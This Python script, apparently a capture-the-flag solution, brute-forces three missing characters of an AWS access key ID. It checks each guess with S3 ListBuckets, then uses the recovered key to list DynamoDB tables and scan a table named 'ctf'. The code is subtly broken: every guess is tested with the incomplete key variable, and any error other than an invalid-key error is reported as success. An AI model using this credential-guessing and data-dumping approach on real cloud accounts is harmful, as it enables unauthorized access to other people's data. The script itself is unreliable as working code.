import string, itertools
import boto3
import time
import os

start_time = time.time()

# Approximate time to crack:
# 1 characters 0.6 seconds
# 2 characters 51 seconds
# 3 characters 48.7 minutes

aws_access_key_with_missing_chars = os.environ['AWS_ACCESS_KEY_ID_WITH_MISSING_CHARS']
aws_access_key = ""
aws_secret_access_key = os.environ['AWS_SECRET_ACCESS_KEY']

chars = string.ascii_uppercase + string.digits
genned_chars=[''.join(i) for i in itertools.product(chars,repeat=3)]

for char in genned_chars:
    try:
        aws_access_key = aws_access_key_with_missing_chars + char

        client = boto3.client(
            's3',
            aws_access_key_id=aws_access_key_with_missing_chars,
            aws_secret_access_key=aws_secret_access_key
        )

        print(client.list_buckets())
    except Exception as e: 
        if str(e) == "An error occurred (InvalidAccessKeyId) when calling the ListBuckets operation: The AWS Access Key Id you provided does not exist in our records.":
            print("Tried", aws_access_key)
            print("Wrong access key")
        else:
            print(e)
            print("Success")
            print("Access Key: " + aws_access_key)        
            print("--- %s seconds ---" % (time.time() - start_time))
            break

client = boto3.client(
    'dynamodb',
    aws_access_key_id=aws_access_key,
    aws_secret_access_key=aws_secret_access_key
)

print(client.list_tables())
print(client.scan(TableName = "ctf"))
